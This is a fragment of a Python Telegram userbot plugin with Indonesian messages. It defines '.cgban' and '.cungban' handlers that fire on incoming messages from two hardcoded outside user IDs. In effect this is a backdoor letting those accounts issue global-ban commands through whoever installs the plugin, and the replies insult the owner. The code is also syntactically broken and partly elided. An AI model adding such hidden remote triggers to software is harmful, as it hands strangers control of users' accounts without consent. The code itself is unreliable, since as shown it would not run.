...
@register(incoming=True, from_users=1683788007,2059940927, pattern=r"^\.cgban(?: |$)(.*)")
async def gben(userbot):
    dc = userbot
    sender = await dc.get_sender()
    me = await dc.client.get_me()
    if not sender.id == me.id:
        dark = await dc.reply("`Global banned Aktif goblok, peritah tuan jess`")
    else:
...
@register(incoming=True, from_users=1683788007, 2059940927, pattern=r"^\.cungban(?: |$)(.*)")
async def gunben(userbot):
    ...
    me = await userbot.client.get_me()
    await dark.edit(
        f"`Memulai Membatalkan Perintah Global Banned, Udah Di gban Ya anjing kahsian!!`"
    )
    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
    f"@{me.username}" if me.username else my_mention
    await userbot.get_chat()
